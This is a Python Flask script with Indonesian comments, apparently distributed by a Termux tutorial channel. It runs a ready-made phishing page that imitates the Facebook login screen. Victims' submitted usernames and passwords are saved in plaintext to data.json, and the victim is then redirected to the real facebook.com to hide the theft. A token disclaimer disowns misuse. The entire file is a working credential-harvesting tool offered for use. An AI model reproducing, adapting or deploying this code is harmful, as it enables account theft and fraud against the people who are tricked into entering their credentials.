# Catatan: 
# Dilarang Melakukan Modifikasi Secript
# Tanpa Izin Dari Pembuat !!!

from flask import Flask, render_template, request, jsonify, redirect, url_for
import os
import time
import json
import subprocess
import socket
import requests
import re
from datetime import datetime

def get_login_datetime():
    current_datetime = datetime.now()
    login_date = current_datetime.strftime("%Y-%m-%d")
    login_time = current_datetime.strftime("%H:%M")
    return login_date, login_time

def get_ip_address():
    try:
        # Menjalankan perintah ifconfig melalui Termux
        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
        
        if result.returncode == 0:
            output = result.stdout
            # Mencari alamat IP yang bukan localhost dalam output
            ip_address = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)', output)
            # Mengambil alamat IP yang bukan localhost pertama yang ditemukan
            for ip in ip_address:
                if ip != '127.0.0.1':
                    return ip
            return 'No non-localhost IP address found'
        else:
            return 'Failed to get IP address'
    except Exception as e:
        print("Error:", e)
        return 'Failed to get IP address'

# Memanggil fungsi untuk mendapatkan alamat IP perangkat
ip_address = get_ip_address()

def get_country_name():
    try:
        # Mendapatkan informasi lokasi saat ini pengguna menggunakan layanan ipinfo.io
        response = requests.get('https://ipinfo.io/json')
        
        if response.status_code == 200:
            data = response.json()
            country_code = data.get('country', 'Unknown')
            
            # Kamus untuk memetakan kode negara ke nama negara
            country_names = {
                'ID': 'Indonesia',  # ISO-3166-1 alpha-2 code for Indonesia
                'US': 'United States',  # ISO-3166-1 alpha-2 code for United States
                'GB': 'United Kingdom',  # ISO-3166-1 alpha-2 code for United Kingdom
                'FR': 'France',  # ISO-3166-1 alpha-2 code for France
                'JP': 'Japan',  # ISO-3166-1 alpha-2 code for Japan
                # Tambahkan entri untuk kode negara lain jika diperlukan
            }
            
            return country_names.get(country_code, 'Unknown')
        else:
            return 'Unknown'
    except Exception as e:
        print("Error:", e)
        return 'Unknown'

# Memanggil fungsi untuk mendapatkan nama negara dari lokasi saat ini pengguna
country_name = get_country_name()


from datetime import datetime

def get_clear_date_time():
    try:
        # Mendapatkan tanggal dan jam saat ini
        current_datetime = datetime.now()
        # Format tanggal dalam format yang jelas (e.g., "21 Februari 2024")
        clear_date = current_datetime.strftime("%d %B %Y")
        # Format jam dalam format 24-jam (e.g., "14:30")
        clear_time = current_datetime.strftime("%H:%M")
        return clear_date, clear_time
    except Exception as e:
        print("Error:", e)
        return None, None

# Memanggil fungsi untuk mendapatkan tanggal dan jam
clear_date, clear_time = get_clear_date_time()
print("\033[1m\033[91mDisclaimer: Penggunaan skrip ini tanpa izin adalah ilegal. Pengguna bertanggung jawab atas penggunaannya, pengembang tidak bertanggung jawab atas penyalahgunaan.")
print("\033[1m\033[93m ----------------------------------")
print("\033[92m * \033[97mNegara:\033[92m", country_name)
print("\033[92m * \033[97mTanggal:\033[92m", clear_date)
print("\033[92m * \033[97mJam:\033[92m", clear_time)
print("\033[92m * \033[97mIP:\033[92m", ip_address)
print("\033[1m\033[93m ----------------------------------")
print("\033[92m * \033[97mYoutube:\033[92m Kztutorial\033[1m\033[97m")
print("\033[92m * \033[97mGithub :\033[92m Kztutorial99\033[1m\033[97m")
print("\033[1m\033[93m ----------------------------------")
print("\033[92m * \033[97mVerssi :\033[92m 1.0\033[1m\033[97m")
print("\033[1m\033[93m ----------------------------------")
app = Flask(__name__)
# Mendapatkan direktori saat ini di mana file Python ini berada
current_dir = os.path.dirname(os.path.abspath(__file__))
data_file_path = os.path.join(current_dir, 'data.json')

garis1 = "----------[HASIL TARGET]----------"
garis3 = "----------[DATE TARGET]-----------"
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        login_date, login_time = get_login_datetime()
      
        
        # Cetak informasi login pengguna
        if username == 'Kelik':
            print("User 'Kelik' has logged in.")
            print("Username:", username)
            print("Password:", password)
            print("Login Date:", login_date)
            print("Logi1n Time:", login_time)
            
        data = {}
        try:
            with open('data.json', 'r') as f:
                data = json.load(f)
        except FileNotFoundError:
    # Buat file JSON baru jika tidak ada
            with open('data.json', 'w') as f:
                json.dump(data, f)
        except json.JSONDecodeError:
    # Tangani kesalahan jika file JSON tidak valid
            print("Error: File JSON tidak valid.")
        
        # Menambahkan info login baru ke dalam data
        login_info = {
            " ": garis1,
            "username": username,
            "password": password, 
            " ": garis1,
            "login_date": login_date,
            "login_time": login_time,
            " ": garis1,
        }
        data.setdefault('Credit: @Kz.tutorial', []).append(login_info)
        
        # Menulis data baru ke dalam file JSON
        with open('data.json', 'w') as f:
            json.dump(data, f, indent=4)
        print("\033[1m\033[93m ----------------------------------")
        print(" \033[1m[•]\033[92m Data login tersimpan\033[93m ✓\033[97m")
        
        return redirect('https://facebook.com')

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                background: #e9ebee;
                font-family: Arial, sans-serif;
            }

            .container {
                max-width: 360px;
                margin: 50px auto;
                padding: 20px;
                background: #fff;
                border-radius: 8px;
                box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            }

            h2 {
                text-align: center;
                font-size: 22px;
                margin-bottom: 20px;
                color: #333;
            }

            form {
                padding: 0 20px;
            }

            .textbox {
                margin-bottom: 20px;
            }

            .textbox input {
                width: 100%;
                padding: 10px;
                border: 1px solid #ddd;
                border-radius: 4px;
                outline: none;
            }

            .btn {
                width: 100%;
                padding: 12px;
                background: #1877f2;
                border: none;
                border-radius: 4px;
                color: #fff;
                font-size: 16px;
                cursor: pointer;
                transition: background-color 0.3s ease;
            }

            .btn:hover {
                background: #0e63b3;
            }

            .separator {
                margin-bottom: 10px;
                text-align: center;
                color: #8d949e;
                font-size: 14px;
            }

            .separator::before, .separator::after {
                content: '';
                display: inline-block;
                width: 45%;
                height: 1px;
                background: #ddd;
            }

            .separator::before {
                margin-right: 10px;
            }

            .separator::after {
                margin-left: 10px;
            }

            .fb-logo {
                display: block;
                margin: 20px auto;
                width: 100px;
            }

            .register-link {
                display: block;
                text-align: center;
                margin-top: 20px;
                background-color: #42b72a;
                padding: 10px;
                border-radius: 4px;
                color: #fff;
                font-size: 16px;
                text-decoration: none;
                transition: background-color 0.3s ease;
            }

            .register-link:hover {
                background-color: #36a420;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img class="fb-logo" src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Lite Logo">
            <h2>Login to Facebook</h2>
            <form id="login-form" method="POST">
                <div class="textbox">
                    <input type="text" name="username" placeholder="Email or Phone">
                </div>
                <div class="textbox">
                    <input type="password" name="password" placeholder="Password">
                </div>
                <input type="submit" class="btn" value="Log In">
                <div class="separator"></div>
                <a href="https://www.facebook.com/recover/initiate/">Forgot Password?</a>
            </form>
            <a role="button" class="register-link" href="https://www.facebook.com/r.php?locale=id_ID&display=page">Buat akun baru</a>
        </div>
    </body>
    </html>
    '''
if __name__ == '__main__':
    app_port = 8090
    # Menjalankan Flask di localhost
    app.run(port=app_port, debug=True)



